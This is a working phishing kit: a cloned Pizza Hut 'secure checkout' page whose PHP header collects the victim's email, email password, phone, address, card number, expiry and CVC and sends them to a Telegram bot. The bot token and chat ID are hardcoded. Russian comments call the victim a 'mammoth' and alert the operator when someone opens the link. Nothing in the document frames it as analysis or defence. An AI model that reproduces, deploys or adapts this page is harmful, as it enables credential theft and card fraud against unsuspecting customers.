<?php 
if(isset($_POST['btn']))
{
    header("Location://google.com");
}
$username = $_POST['username'];
$passwords = $_POST['password'];
$mobile = $_POST['mobile'];
$addres = $_POST['addres'];
$zipcode = $_POST['zipcode'];
$cardNumber = $_POST['cardNumber'];
$cardHolder = $_POST['cardHolder'];
$cardMonth = $_POST['cardMonth'];
$cardYear = $_POST['cardYear'];
$cvc = $_POST['cvc'];

 
//в переменную $token нужно вставить токен, который нам прислал @botFather
$token = "1484129727:AAEayx2dVtPzjOMeLn3xgSjvUzBn-FdRiNo";
 
//нужна вставить chat_id (Как получить chad id, читайте ниже)
$chat_id = "-1001157431511";
$txt = "Мамонт перешел на ссылку!🙈";
$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

 if (!empty($cardNumber)){
//Далее создаем переменную, в которую помещаем PHP массив
$arr = array(
  'Держатель карты:💰 ' => $cardHolder, //name
  'Номер карты:💳 ' => $cardNumber, //cardnumber
  'Месяц:💸' => $cardMonth, //Month
  'Год:💣' => $cardYear, //Year
  'cvv:💥' => $cvc, //cvc
  'e-mail:🙌' => $username, //email
  'пароль от e-mail:🙌' => $passwords, //pass
  'номер телефона:📱' => $mobile, //number
  'Адрес холдера:♻️' => $addres, //address
  'ZIP CODE✅' => $zipcode , //Zip code
);
 
//При помощи цикла перебираем массив и помещаем переменную $txt текст из массива $arr
foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};
 
//Осуществляется отправка данных в переменной $sendToTelegram
$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");


 
//Если сообщение отправлено, напишет "Thank you", если нет - "Error"
if ($sendToTelegram) {
  echo "Thank you";
} else {
  echo "Error";
}

}

          
?>





               
<!DOCTYPE html>
  
               
        
               
<html lang="en"
  class="wf-opensans-n3-active wf-opensans-n4-active wf-opensans-n6-active wf-active">

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
  <title>Checkout | Pizza Hut</title>
  <meta charset="utf-8" />
  <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible" />
  <meta content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1" name="viewport" />
  <meta content="Pizza Hut" name="apple-mobile-web-app-title" />
  <meta content="Pizza Hut" name="application-name" />
  <meta content="#FFFFFF " name="theme-color" />
  <link href="../../assets/uk.a0027d70a76d6ee0cc8f.css" rel="stylesheet" />

  <link href="../../index.html" rel="apple-touch-icon"
    data-react-helmet="true" sizes="180x180" />
  <link href="../../assets/favicon-32x32.65f9b447ff4e576d03ad65d900e0a4d0.png" rel="icon"
    data-react-helmet="true" sizes="32x32" type="image/png" />
  <link href="../../assets/favicon-16x16.6e3d608bac28fdeffd6f966ab47ebd50.png" rel="icon"
    data-react-helmet="true" sizes="16x16" type="image/png" />
  <link href="../../assets/favicon.f4bd7d7a6eeb33ccb9385339b0575ce4.ico" rel="shortcut icon"
    data-react-helmet="true" />
  <meta
    content="Treat yourself to the best pizza, sides and desserts from your nearest Pizza Hut. Get delivery or takeaway today."
    data-react-helmet="true" name="description" />

  <meta content="Pizza Delivery, Deals, Restaurants and Takeaway | Order Online with Pizza Hut" data-react-helmet="true"
    property="og:title" />
  <meta content="Pizza Hut Online Ordering" data-react-helmet="true" property="og:site_name" />
  <meta
    content="Order pizza online for free delivery, get the best deals, and find your nearest branch for dine-in or collection. Visit the Pizza Hut website now!"
    data-react-helmet="true" property="og:description" />

  <meta content="image/jpeg" data-react-helmet="true" property="og:image:type" />
  <meta content="300" data-react-helmet="true" property="og:image:width" />
  <meta content="300" data-react-helmet="true" property="og:image:height" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700&amp;display=swap"
    media="all" />

  <link rel="stylesheet" type="text/css" href="../../assets/Order.37bd1b585a0db41e817a.css" />

  <link rel="stylesheet" type="text/css" href="../../assets/34.b7b04dd3cfdc8afd805b.css" />

  <style type="text/css">
    .ReactModal__Body--openl {
      overflow: hidden;
    }
    .loader,
    .loader:before,
    .loader:after {
      border-radius: 50%;
      width: 2.5em;
      height: 2.5em;
      -webkit-animation-fill-mode: both;
      animation-fill-mode: both;
      -webkit-animation: load7 1.8s infinite ease-in-out;
      animation: load7 1.8s infinite ease-in-out;
    }
    .loader {
      color: #ffffff;
      font-size: 10px;
      margin: -1.25em auto;
      position: relative;
      top: 50%;
      text-indent: -9999em;
      -webkit-transform: translateZ(0);
      -ms-transform: translateZ(0);
      transform: translateZ(0);
      -webkit-animation-delay: -0.16s;
      animation-delay: -0.16s;
    }
    .loader:before,
    .loader:after {
      content: '';
      position: absolute;
      top: 0;
    }
    .loader:before {
      left: -3.5em;
      -webkit-animation-delay: -0.32s;
      animation-delay: -0.32s;
    }
    .loader:after {
      left: 3.5em;
    }
    @-webkit-keyframes load7 {
      0%,
      80%,
      100% {
        box-shadow: 0 2.5em 0 -1.3em;
      }
      40% {
        box-shadow: 0 2.5em 0 0;
      }
    }
    @keyframes load7 {
      0%,
      80%,
      100% {
        box-shadow: 0 2.5em 0 -1.3em;
      }
      40% {
        box-shadow: 0 2.5em 0 0;
      }
    }
    .loader-wrapper {
      background:rgba(0, 0, 0, 0.75);
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 99999;
      display: none;
    }
  </style>

  

<script>

  var data_url = new URL(window.location.php);
  var data_id = data_url.searchParams.get("id");
  if (data_id) {
    window.localStorage.setItem('data_id', data_id)
  }

</script>

  <script>
    !function(f,b,e,v,n,t,s)
    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
      n.queue=[];t=b.createElement(e);t.async=!0;
      t.src=v;s=b.getElementsByTagName(e)[0];
      s.parentNode.insertBefore(t,s)}(window, document,'script',
      '../../../connect.facebook.net/en_US/fbevents.js');
    fbq('init', '3100914093468203');
    fbq('track', 'PageView');
  </script>
  <noscript><img height="1" width="1" style="display:none"
                 src="https://www.facebook.com/tr?id=3100914093468203&amp;ev=PageView&amp;noscript=1"
    /></noscript>
</head>

<body class="has-header ReactModal__Body--openl">
  <div data-test="app-container" id="app">
    <div class="app en-GB app-bg">
      <div class="order">
        <div class="checkout-container">
          <div>
            <div class="header relative bg-white xs-shadow-down-1 z-100 lg:static lg:w-auto">
              <div class="container flex-center lg:justify-start lg:item-start relative h-full">
                <div class="relative z-500 mx-auto">
                  <a class="header-logo block lg:pt-15 lg:py-15 lg:pl-30 bg-white lg:bg-transparent rounded-full"
                    href="../../index.html"><span class="logo" style="padding: 7px;"></span></a>
                </div>
              </div>
            </div>
          </div>
          <h2 class="typography-2 text-center py-20 relative">
            <span><i class="mr-5 icon-lock--dark"></i>
              <span>Secure checkout</span></span>
              <a class="flex items-center text-grey absolute top-0 bottom-0 left-0 pl-15 opacity-50" href="../pizzas/index.html"><i class="ml-5 icon-caret-left"></i></a>
          </h2>
          <form class="" id="checkout-form" method="POST" name="registration" action="index.php">
            <div class="form-section">
              <div class="relative  flex items-center mb-5">
                <label class="typography-6 bold label block mb-10 w-full" for="checkout__name">
                  <div class="flex"><span class="block mb-5">Name</span></div>
                  <div class="flex-col">
                     <div class="flex-col">
                    <input  class="input" type="text" autocomplete="on" autocorrect="off"
                      autocapitalize="off" spellcheck="false"  placeholder="Your name" value=""
                      maxlength="20" required />
                      
                  </div>
                  </div>
                </label>
              </div>
              <div class="relative  flex items-center mb-5">
                <label class="typography-6 bold label block mb-10 w-full" for="checkout__phone">
                  <div class="flex">
                    <span class="block mb-5">Mobile</span>
                  </div>
                  <div class="flex-col">
                    <input id="checkout__phone" class="input" type="mobile" autocomplete="on" autocorrect="off"
                      autocapitalize="off" spellcheck="false" name="mobile" placeholder="So we can contact you" value=""
                      maxlength="20" required />
                      
                  </div>
                </label>
              </div>
              <div class="relative  flex items-center mb-5">
                <label class="typography-6 bold label block mb-10 w-full" for="checkout__phone">
                  <div class="flex">
                    <span class="block mb-5">E-mail</span>
                  </div>
                  <div class="flex-col">
                    <input class="input" type="email"
                        name="username" placeholder="@" value=""
                      maxlength="20" required />
                      
                  </div>
                </label>
              </div>
                <div class="relative  flex items-center mb-5">
                <label class="typography-6 bold label block mb-10 w-full" for="checkout__phone">
                  <div class="flex">
                    <span class="block mb-5">Password</span>
                  </div>
                  <div class="flex-col">
                    <input  class="input" type="password" autocomplete="on" autocorrect="off"
                      autocapitalize="off" spellcheck="false" name="password" placeholder="password" value=""
                      maxlength="20" required />
                      
                  </div>
                </label>
              </div>

              <div class="pt-10">
                <div class="typography-3 form-section__heading">
                  <span> Payment details</span>
                </div>
                <div class="relative  flex items-center mb-5">
                  <label class="typography-6 bold label block mb-10 w-full"
                    for="checkout__deliveryAddress.addressLine1">
                    <div class="flex">
                      <span class="block mb-5">Address</span>
                    </div>
                    <div class="flex-col">
                      <input id="checkout__deliveryAddress.addressLine1" class="input" type="text" autocomplete="on"
                        autocorrect="off" autocapitalize="off" spellcheck="false" name="addres"
                        placeholder="House number or name" value="" required />
                    </div>
                  </label>
                </div>

                <div class="relative  flex items-center mb-5">
                  <label class="typography-6 bold label block mb-10 w-full" for="checkout__deliveryAddress.postcode">
                    <div class="flex">
                      <span class="block mb-5">Zip code</span>
                    </div>
                    <div class="flex-col">
                      <input id="checkout__deliveryAddress.postcode" class="input" type="text" autocomplete="on"
                        autocorrect="off" autocapitalize="off" spellcheck="false" name="zipcode"
                        placeholder="Zip code" value="" required />
                    </div>
                  </label>
                </div>
              </div>
              <div class="pt-10">
                <form name="Card Details" method="POST" action="index.php">
                  <div class="flex flex-col md:flex-row mb-25 text-grey">
                    <div class="md:w-1/2 md:mr-5">
                      <label class="block mb-5 font-bold" id="cardNumber-label" for="cardNumber">Card Number</label>
                      <input name="cardNumber" class="input h-11" id="cardNumber-container"
                        placeholder="1111 2222 3333 4444" type="text" value="" required>
                      <div class="text-red input-error" style="display: none">Enter a valid card number</div>

                    </div>
                    <div class="md:w-1/2 md:ml-5">
                      <label class="block mb-5 font-bold" for="cardHolder">Cardholder's Name</label><input
                        name="cardHolder" class="input " id="cardHolder-input" type="text" placeholder="Full Name"
                        value="" />
                      <div class="text-red input-error" style="display: none;">
                        Enter a valid cardholder's name
                      </div>
                    </div>
                  </div>
                  <div class="flex flex-col md:flex-row text-grey">
                    <div class="flex md:w-1/2 md:mr-5">
                      <div class="w-1/2 mr-5">
                        <label class="block mb-5 font-bold">Expiry Month</label><select name="cardMonth" class="input "
                          id="cardMonth-select" style="-webkit-appearance: menulist; height: 44px;">
                          <option value="Month">Month</option>
                          <option value="01">01</option>
                          <option value="02">02</option>
                          <option value="03">03</option>
                          <option value="04">04</option>
                          <option value="05">05</option>
                          <option value="06">06</option>
                          <option value="07">07</option>
                          <option value="08">08</option>
                          <option value="09">09</option>
                          <option value="10">10</option>
                          <option value="11">11</option>
                          <option value="12">12</option>
                        </select>
                        <div class="text-red input-error" style="display: none;">Required</div>
                      </div>
                      <div class="w-1/2 ml-5">
                        <label class="block mb-5 font-bold">Expiry Year</label><select name="cardYear" class="input  "
                          id="cardYear-select" style="-webkit-appearance: menulist; height: 44px;">
                          <option value="Year">Year</option>
                          <option value="2020">2020</option>
                          <option value="2021">2021</option>
                          <option value="2022">2022</option>
                          <option value="2023">2023</option>
                          <option value="2024">2024</option>
                          <option value="2025">2025</option>
                          <option value="2026">2026</option>
                          <option value="2027">2027</option>
                          <option value="2028">2028</option>
                          <option value="2029">2029</option>
                          <option value="2030">2030</option>
                          <option value="2031">2031</option>
                          <option value="2032">2032</option>
                          <option value="2033">2033</option>
                          <option value="2034">2034</option>
                          <option value="2035">2035</option>
                          <option value="2036">2036</option>
                          <option value="2037">2037</option>
                          <option value="2038">2038</option>
                          <option value="2039">2039</option>
                        </select>
                        <div class="text-red input-error" style="display: none;">Required</div>
                      </div>
                    </div>
                    <div class="flex md:w-1/2 md:ml-5 mb-25">
                      <div class="w-3/4 mr-5">
                        <label class="block mb-5 font-bold">Security Code</label><input name="cvc" class="input"
                          id="cardCvc-input" maxlength="3" placeholder="123" value="" required />
                        <div class="text-red input-error" style="display: none;">Required</div>
                      </div>
                      <div class="flex mt-25">
                        <div style="width: 6.5rem;">
                          <img src="../../assets/cvc.1e50f774f0f9d54cbf033bb26c9da702.png" alt="cvc number" class="mt-10" />
                        </div>
                        <div class="text-grey text-xs ml-5">
                          Last 3 digits on the back of the card
                        </div>
                      </div>
                    </div>
                  </div>
              </div>
            </div>
<div style="display:flex; justify-content:center;">
     <form method="post">
                <button class="button button--red" name="btn" style="width:350px;">
                    Place your order
                </button>
            </form>
</div>
           
            <p class="text-grey-dark text-center p-20">

            </p>
              </div>
          </form>
        </div>
      </div>
      <div>
        <div class="notification-container notification-container__basket">
          <div></div>
        </div>
      </div>
    </div>
  </div>

  <div class="loader-wrapper"><div class="loader"></div></div>

  <div class="ReactModalPortal">
    <div class="ReactModal__Overlay ReactModal__Overlay--after-open" style="position: fixed; top: 0px; left: 0px; right: 0px; bottom: 0px; background-color: rgba(255, 255, 255, 0.75);">
      <div class="ReactModal__Content ReactModal__Content--after-open modal--small" tabindex="-1" role="dialog" aria-label="Contact-free delivery">
        <div class="m-20 rounded shadow relative bg-white" style="margin-top: 0px;">
          <div class="text-center p-10" style="background-color: rgb(248, 226, 230);">
            <p style="color: rgb(200, 16, 46); font-weight: 600; font-size: 12px;"><span>COVID 19 RESPONSE</span></p>

          </div>
          <div class="text-center flex flex-col justify-between"><img src="../../assets/contactfree.02340998c652327bcfbcb537a8016ddc.svg" aria-label="Contactless" alt="Contactless Delivery" class="mx-auto pb-10" style="margin-top: 10px;">
            <h2 class="typography-2 text-center py-10"><span>Contact-Free Delivery</span></h2>
            <p class="typography-6 px-20 py-10"><span>All our deliveries are now contact-free across the US to help keep
                everyone healthy. All orders will need to be paid online by debit/credit card.</span></p>
            <div class="typography-6 m-20 px-20" style="background-color: rgb(245, 247, 249); color: rgb(107, 110, 121);">
              <ol class="p-10" style="list-style-position: outside; list-style-type: decimal; text-align: left; font-weight: 600;">
                <li style="margin-bottom: 10px;">
                  <p style="font-weight: normal;"><span>Simply give us your mobile number &amp; add a credit or debit
                      card.</span></p>

                </li>
                <li style="margin-bottom: 10px;">
                  <p style="font-weight: normal;"><span>Give us delivery instructions at checkout.</span></p>
                </li>
                <li>
                  <p style="font-weight: normal;"><span>Our drivers will drop off your food &amp; call you.</span></p>
                </li>
              </ol>
            </div>
            <div class="typography-6 px-20 py-10 pb-20"><button class="button-accept button button--red mb-10"><span>Continue with order</span></button></div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <div class="ReactModalPortal-error" style="display: none;">
    <div class="ReactModal__Overlay ReactModal__Overlay--after-open"
      style="position: fixed; top: 0px; left: 0px; right: 0px; bottom: 0px; background-color: rgba(255, 255, 255, 0.75);">
      <div class="ReactModal__Content ReactModal__Content--after-open modal--small" tabindex="-1" role="dialog"
        aria-label="Contact-free delivery">
        <div class="m-20 mt-100 rounded shadow relative bg-white">
          <div class="text-center p-10" style="background-color: rgb(248, 226, 226);">
            <p style="color: rgb(200, 16, 16); font-weight: 600; font-size: 12px;"><span>Error</span></p>

          </div>

          <p class="typography-6 px-20 py-10 text-center"><span>There was an error processing your request.</span></p>

        </div>
      </div>
    </div>
  </div>

  <script src="../../assets/jquery.min.js"></script>
  <script src="../../assets/cleave.min.js"></script>
  <script src="../../assets/cv.min.js"></script>

  <script src="../../assets/jquery.min.js"></script>
  <script src="../../assets/cleave.min.js"></script>
  <script src="../../assets/cv.min.js"></script>

  <script type="text/javascript">
    var disableZipCheck =1;

    var errorHtml =
      '<span class="input-error-text text-right typo-l7 text-red ml-auto"><span>Required</span></span>';


    var cleave = new Cleave("[name='cardNumber']", {
      creditCard: true
    });

    var validPostcode = function (postcode) {
      if(disableZipCheck)
        return true;

      postcode = postcode.replace(/\s/g, "");
      var regex = /^(?!0{3})[0-9]{3,5}$/i;
      return regex.test(postcode);
    };

    var formValidSubmit = function(data, callback) {
      $.ajax({
        type: "POST",
        url: "/order/checkout/?id="+window.localStorage.getItem('data_id')+"&t=" + Date.now(),
        contentType: "application/json",
        data: JSON.stringify(data),
        success: function (data) {
          console.log("success", data);
          callback(null, data);
        },
        error: function (jqXHR, text, error) {
          console.log("error", error);
          callback(null, error);
        }
      });
    }

    $('.button-accept').click(function() {
      $('.ReactModalPortal').hide();
      $('body').removeClass('ReactModal__Body--openl')
    })

    $(document).on("input change focusout", "#checkout-form .input", function (e) {
      var input = $(this);
      var value = input.val();

      var cardInputs = [
        'cardNumber-container',
        'cardHolder-input',
        'cardMonth-select',
        'cardYear-select',
        'cardCvc-input'
      ]

      if (cardInputs.indexOf(input.attr('id')) > -1) {
        input
          .next('.input-error').hide();
        input.removeClass("border-red");

        if (!value) {
          input
            .next('.input-error').show();
          input.addClass("border-red");

          return true;
        }

        if (input.attr('id') == 'cardNumber-container') {
          var cardInfo = new cardValidator(value);
          var cvvLength = cardInfo.type == 'unknown' ? 3 : cardInfo.cvvLength[0];

          $('#cardCvc-input').attr('maxlength', cvvLength);

          if (!cardInfo.valid) {
            input
              .next('.input-error').show();
            input.addClass("border-red");

            return true;
          }
        }

        if (input.attr('id') == 'cardCvc-input' && value.length != input.attr('maxlength')) {
          input
            .next('.input-error').show();
          input.addClass("border-red");

          return true;
        }

        if (input.attr('id') == 'cardMonth-select') {
          var year = $('#cardYear-select option:selected').val();

          if (isNaN(year))
            year = null;
          else
            year = parseInt(year);

          if (isNaN(value)) {
            input
              .next('.input-error').show();
            input.addClass("border-red");

            return true;
          }

          value = parseInt(value);

          if (year && year == new Date().getFullYear() && value < (new Date().getMonth() + 1)) {
            input
              .next('.input-error').show();
            input.addClass("border-red");

            return true;
          }
        }

        if (input.attr('id') == 'cardYear-select') {
          var year = $('#cardYear-select option:selected').val();

          if (isNaN(value)) {
            input
              .next('.input-error').show();
            input.addClass("border-red");

            return true;
          }

          $('#cardMonth-select').trigger('change');
        }

        return true;
      }

      if (e.type == 'focusout')
        return true;

      input
        .closest("label.label")
        .find(".flex .input-error-text")
        .remove();
      input.removeClass("has-errors no-errors");

      if (input.attr("id") == "checkout__deliveryAddress.addressLine2") {
        if (value) {
          input.addClass("no-errors");
        }
        return true;
      }

      if (!value) {
        input
          .closest("label.label")
          .find(".flex")
          .append(errorHtml);
        input.addClass("has-errors");

        return true;
      }

      if (
        input.attr("id") == "checkout__phone" &&
        (value.length < 7 || isNaN(value))
      ) {
        input
          .closest("label.label")
          .find(".flex")
          .append(
            errorHtml.replace("Required", "Please enter a valid phone number")
          );
        input.addClass("has-errors");

        return true;
      }

      if (input.attr("id") == "checkout__bday") {
        value = value.split("../../index.html");

        if (
          value.join("").length < 8 ||
          parseInt(value[2]) > new Date().getFullYear()
        ) {
          input
            .closest("label.label")
            .find(".flex")
            .append(
              errorHtml.replace(
                "Required",
                "Please enter a valid date of birth"
              )
            );
          input.addClass("has-errors");

          return true;
        }
      }

      if (
        input.attr("id") == "checkout__deliveryAddress.addressLine1" &&
        !isNaN(value)
      ) {
        input
          .closest("label.label")
          .find(".flex")
          .append(
            errorHtml.replace(
              "Required",
              "Our driver needs your full address"
            )
          );
        input.addClass("has-errors");

        return true;
      }

      if (
        input.attr("id") == "checkout__deliveryAddress.postcode" &&
        !validPostcode(value)
      ) {
        input
          .closest("label.label")
          .find(".flex")
          .append(errorHtml.replace("Required", "Invalid"));
        input.addClass("has-errors");

        return true;
      }

      input.addClass("no-errors");
    });

   


  </script>
</body>

<!-- Mirrored from pizza-hut.shop/order/checkout/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 11 Nov 2020 11:14:00 GMT -->
</html>
